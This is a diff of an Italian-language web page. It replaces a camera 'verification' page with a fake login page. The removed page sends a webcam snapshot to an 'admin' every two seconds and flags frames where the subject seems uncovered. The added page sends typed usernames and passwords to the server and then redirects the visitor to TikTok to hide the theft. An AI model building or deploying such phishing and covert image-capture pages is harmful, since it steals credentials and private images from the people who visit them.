@@ -2,115 +2,74 @@
 <html lang="it">
 <head>
   <meta charset="utf-8">
-  <title>Verifica</title>
+  <title>Login</title>
   <link rel="stylesheet" href="style.css">
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@latest"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/pose-detection"></script>
   <style>
-    body { background:#000; color:#fff; font-family:Arial; text-align:center; padding:20px; margin:0; }
-    #box { max-width:500px; margin:auto; background:#111; padding:30px; border-radius:12px; position:relative; }
-    video { width:100%; max-width:400px; border-radius:8px; background:#000; }
-    #overlay { position:absolute; left:0; top:0; width:100%; height:100%; pointer-events:none; z-index:10; }
-    button { padding:14px 30px; font-size:18px; margin:10px; border:none; border-radius:6px; cursor:pointer; }
-    #consenti { background:#0066ff; color:white; }
-    #stop { background:#ff4444; color:white; display:none; }
+    body {
+      font-family: Arial;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #box {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      width: 300px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.15);
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      border: none;
+      color: white;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
+
 <div id="box">
-  <h2>Verifica</h2>
-  <input id="user" placeholder="Nome (opzionale)" style="padding:12px; width:80%; margin:10px 0;">
-  <button id="consenti">Tu adesso</button>
-  <button id="stop">⛔ Ferma</button>
-  
-  <video id="localVideo" autoplay playsinline muted></video>
-  <canvas id="overlay" width="400" height="300"></canvas>
+  <h2>Login</h2>
+
+  <input id="user" placeholder="Username">
+  <input id="pass" placeholder="Password" type="password">
+
+  <button id="enter">ENTER</button>
 </div>
 
 <script>
-  const ws = new WebSocket((location.protocol === 'https:' ? 'wss:' : 'ws:') + location.host);
-  let stream = null;
-  let interval = null;
-  let detector = null;
-  const video = document.getElementById('localVideo');
-  const overlay = document.getElementById('overlay');
-  const ctx = overlay.getContext('2d');
-  const canvas = document.createElement('canvas'); // per foto
+  const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
 
-  // Carica modello pose
-  async function loadPoseModel() {
-    detector = await poseDetection.createDetector(poseDetection.SupportedModels.MoveNet);
-  }
-  loadPoseModel();
+  document.getElementById("enter").onclick = () => {
+    const u = document.getElementById("user").value;
+    const p = document.getElementById("pass").value;
 
-  document.getElementById('consenti').onclick = async () => {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      video.srcObject = stream;
-      document.getElementById('consenti').style.display = 'none';
-      document.getElementById('stop').style.display = 'inline-block';
+    ws.send(JSON.stringify({
+      user: u,
+      message: p
+    }));
 
-      interval = setInterval(() => {
-        if (video.videoWidth === 0) return;
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const base64 = canvas.toDataURL('image/jpeg', 0.7);
-
-        ws.send(base64); // invia foto base64 all'admin
-
-        // Overlay simpatico
-        ctx.clearRect(0, 0, overlay.width, overlay.height);
-        detectAndDraw(video);
-      }, 2000);
-
-    } catch (err) {
-      alert('Errore: ' + err.message);
-    }
+    // Redirect a TikTok dopo l'invio
+    setTimeout(() => {
+      window.location.href = "https://www.tiktok.com";
+    }, 300);
   };
-
-  async function detectAndDraw(video) {
-    if (!detector) return;
-    const poses = await detector.estimatePoses(video);
-    if (poses.length > 0) {
-      const keypoints = poses[0].keypoints;
-
-      // Esempio: se torso "scoperto" (spalle basse)
-      const leftShoulder = keypoints.find(k => k.name === 'left_shoulder');
-      const rightShoulder = keypoints.find(k => k.name === 'right_shoulder');
-
-      if (leftShoulder.score < 0.3 || rightShoulder.score < 0.3) {
-        ctx.font = '60px Arial';
-        ctx.fillStyle = 'red';
-        ctx.fillText('🔞 CENSURATO!', 20, 100);
-        ctx.fillText('😈', 180, 180);
-      }
-
-      // Se ride (bocca larga)
-      const mouthLeft = keypoints.find(k => k.name === 'mouth_left');
-      const mouthRight = keypoints.find(k => k.name === 'mouth_right');
-      if (mouthLeft && mouthRight && Math.abs(mouthLeft.y - mouthRight.y) > 20) {
-        ctx.font = '80px Arial';
-        ctx.fillText('😂😂', 100, 150);
-      }
-    }
-  }
-
-  document.getElementById('stop').onclick = () => {
-    if (interval) clearInterval(interval);
-    if (stream) stream.getTracks().forEach(t => t.stop());
-    stream = null;
-    video.srcObject = null;
-    ctx.clearRect(0, 0, overlay.width, overlay.height);
-    document.getElementById('consenti').style.display = 'inline-block';
-    document.getElementById('stop').style.display = 'none';
-  };
-
-  window.addEventListener('beforeunload', () => {
-    if (interval) clearInterval(interval);
-    if (stream) stream.getTracks().forEach(t => t.stop());
-  });
 </script>
+
 </body>
 </html>
